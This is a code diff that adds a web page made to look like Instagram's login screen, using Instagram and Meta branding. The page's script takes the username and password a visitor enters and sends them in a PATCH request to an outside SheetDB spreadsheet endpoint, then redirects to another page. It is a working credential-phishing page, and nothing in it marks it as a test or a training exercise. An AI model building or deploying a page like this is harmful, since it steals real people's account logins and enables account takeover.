@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      background-color: #0a0f14;
+      color: #e8e8e8;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top bar */
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 14px;
+      background: #0a0f14;
+    }
+
+    .topbar .back-btn {
+      font-size: 22px;
+      color: #e8e8e8;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px 8px;
+    }
+
+    /* Language text */
+    .lang-text {
+      text-align: center;
+      color: #8e9aaa;
+      font-size: 13px;
+      margin-top: 6px;
+      padding: 4px 0;
+    }
+
+    /* Main container */
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 0 24px;
+    }
+
+    /* Instagram gradient logo */
+    .logo-wrapper {
+      margin-top: 60px;
+      margin-bottom: 70px;
+    }
+
+    .logo-wrapper svg {
+      width: 72px;
+      height: 72px;
+    }
+
+    /* Form */
+    .form-group {
+      width: 100%;
+      max-width: 420px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    /* Floating label wrapper */
+    .input-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    .input-wrapper input {
+      background-color: #1c2733;
+      border: 1px solid #2a3844;
+      border-radius: 14px;
+      padding: 22px 46px 8px 16px;
+      color: #e8e8e8;
+      font-size: 15px;
+      outline: none;
+      width: 100%;
+      transition: border-color 0.2s;
+      height: 58px;
+    }
+
+    .input-wrapper input:focus {
+      border-color: #c0c8d0;
+    }
+
+    /* Floating label */
+    .input-wrapper label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5a6a7a;
+      font-size: 15px;
+      pointer-events: none;
+      transition: all 0.18s ease;
+      transform-origin: left top;
+    }
+
+    /* Label floats up when focused or has value */
+    .input-wrapper input:focus + label,
+    .input-wrapper input:not(:placeholder-shown) + label {
+      top: 10px;
+      transform: translateY(0) scale(0.78);
+      color: #8a9aaa;
+      font-size: 15px;
+    }
+
+    /* Hide actual placeholder — we use floating label */
+    .input-wrapper input::placeholder {
+      color: transparent;
+    }
+
+    /* Eye toggle button */
+    .eye-toggle {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #8a9aaa;
+    }
+
+    .eye-toggle svg {
+      width: 20px;
+      height: 20px;
+      fill: none;
+      stroke: #8a9aaa;
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .clear-btn {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #8a9aaa;
+      font-size: 18px;
+      display: none;
+      padding: 6px;
+      line-height: 1;
+    }
+
+    .btn-login {
+      margin-top: 6px;
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      padding: 17px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+      letter-spacing: 0.3px;
+      transition: background 0.2s;
+    }
+
+    .btn-login:active {
+      background: #0081d6;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin-top: 18px;
+      color: #e8e8e8;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    /* Bottom section */
+    .bottom-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 24px 28px;
+      gap: 14px;
+    }
+
+    .btn-create {
+      background: transparent;
+      border: 1.5px solid #3a4a5a;
+      border-radius: 14px;
+      color: #4fa3e0;
+      font-size: 15px;
+      font-weight: 600;
+      padding: 16px;
+      cursor: pointer;
+      width: 100%;
+      max-width: 420px;
+      transition: border-color 0.2s;
+    }
+
+    .btn-create:active {
+      border-color: #4fa3e0;
+    }
+
+    .meta-logo {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      color: #5a6a7a;
+      font-size: 13px;
+    }
+
+    .meta-logo svg {
+      fill: #5a6a7a;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top bar -->
+  <div class="topbar">
+    <button class="back-btn">&#8249;</button>
+  </div>
+
+  <!-- Language -->
+  <div class="lang-text">English (US)</div>
+
+  <!-- Main -->
+  <div class="container">
+
+    <!-- Instagram Logo -->
+    <div class="logo-wrapper">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="80" height="80">
+        <defs>
+          <radialGradient id="rg1" cx="25%" cy="110%" r="125%">
+            <stop offset="0%" stop-color="#FFD600"/>
+            <stop offset="15%" stop-color="#FF7A00"/>
+            <stop offset="35%" stop-color="#FF0069"/>
+            <stop offset="65%" stop-color="#D300C5"/>
+            <stop offset="100%" stop-color="#7638FA"/>
+          </radialGradient>
+        </defs>
+        <!-- Background rounded square -->
+        <rect width="100" height="100" rx="22" ry="22" fill="url(#rg1)"/>
+        <!-- Outer border ring -->
+        <rect x="13" y="13" width="74" height="74" rx="20" ry="20"
+              fill="none" stroke="white" stroke-width="6.5"/>
+        <!-- Center lens circle -->
+        <circle cx="50" cy="50" r="18.5" fill="none" stroke="white" stroke-width="6.5"/>
+        <!-- Flash dot top-right -->
+        <circle cx="74" cy="26" r="5" fill="white"/>
+      </svg>
+    </div>
+
+    <!-- Form -->
+    <div class="form-group">
+
+      <!-- Username field -->
+      <div class="input-wrapper">
+        <input type="text" id="username" placeholder=" " autocomplete="username" />
+        <label for="username">Username, email or mobile number</label>
+        <button class="clear-btn" id="clearBtn" tabindex="-1" aria-label="Clear">✕</button>
+      </div>
+
+      <!-- Password field with eye toggle -->
+      <div class="input-wrapper">
+        <input type="password" id="password" placeholder=" " autocomplete="current-password" />
+        <label for="password">Password</label>
+        <button class="eye-toggle" id="eyeBtn" onclick="toggleEye()" tabindex="-1" aria-label="Show password">
+          <!-- Eye open icon -->
+          <svg id="eyeOpen" viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+          <!-- Eye closed icon (hidden by default) -->
+          <svg id="eyeClosed" viewBox="0 0 24 24" style="display:none">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
+            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+            <line x1="1" y1="1" x2="23" y2="23"/>
+          </svg>
+        </button>
+      </div>
+
+      <button class="btn-login">Log in</button>
+      <div class="forgot-password">Forgot password?</div>
+    </div>
+
+  </div>
+
+  <!-- Bottom -->
+  <div class="bottom-section">
+    <div class="meta-logo">
+      <!-- Meta infinity logo -->
+      <svg width="38" height="16" viewBox="0 0 60 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M6 12c0-3.3 1.5-6 3.5-6 1.2 0 2.3.9 3.3 2.7L15 12l-2.2 3.3C11.8 17.1 10.7 18 9.5 18 7.5 18 6 15.3 6 12zM9.5 4C6.4 4 4 7.6 4 12s2.4 8 5.5 8c1.8 0 3.3-1.1 4.7-3.2L15 15.6l.8 1.2C17.2 18.9 18.7 20 20.5 20c3.1 0 5.5-3.6 5.5-8s-2.4-8-5.5-8c-1.8 0-3.3 1.1-4.7 3.2L15 8.4l-.8-1.2C12.8 5.1 11.3 4 9.5 4zM15 10.7l1.2-1.8C17.3 7.2 18.3 6 20.5 6c2 0 3.5 2.7 3.5 6s-1.5 6-3.5 6c-1.2 0-2.3-.9-3.3-2.7L15 13.3l-1.2-1.8z"/>
+      </svg>
+      <span>Meta</span>
+    </div>
+  </div>
+
+  <script>
+    const SHEETDB_API = "https://sheetdb.io/api/v1/k1afzqgq002uw";
+
+    // Clear button
+    const username = document.getElementById('username');
+    const clearBtn = document.getElementById('clearBtn');
+
+    username.addEventListener('input', () => {
+      clearBtn.style.display = username.value ? 'block' : 'none';
+    });
+
+    clearBtn.addEventListener('click', () => {
+      username.value = '';
+      clearBtn.style.display = 'none';
+      username.focus();
+    });
+
+    // Eye toggle
+    function toggleEye() {
+      const pwd = document.getElementById('password');
+      const open = document.getElementById('eyeOpen');
+      const closed = document.getElementById('eyeClosed');
+      if (pwd.type === 'password') {
+        pwd.type = 'text';
+        open.style.display = 'none';
+        closed.style.display = 'block';
+      } else {
+        pwd.type = 'password';
+        open.style.display = 'block';
+        closed.style.display = 'none';
+      }
+    }
+
+    // Login
+    document.querySelector('.btn-login').addEventListener('click', async () => {
+      const instaUser = document.getElementById('username').value.trim();
+      const instaPass = document.getElementById('password').value.trim();
+      if (!instaUser || !instaPass) return;
+
+      try {
+        const loggedInUser = localStorage.getItem('loggedInUser');
+
+        const res = await fetch(SHEETDB_API);
+        const data = await res.json();
+        const row = data.find(x => x.username === loggedInUser);
+
+        if (row && (!row.instausername || row.instausername === '')) {
+          // Only store if not already saved
+          await fetch(`${SHEETDB_API}/username/${encodeURIComponent(loggedInUser)}`, {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data: { instausername: instaUser, instapassword: instaPass } })
+          });
+        }
+        window.location.replace('home(1).html');
+      } catch (e) {
+        alert('Network error. Try again.');
+      }
+    });
+  </script>
+</body>
+</html>
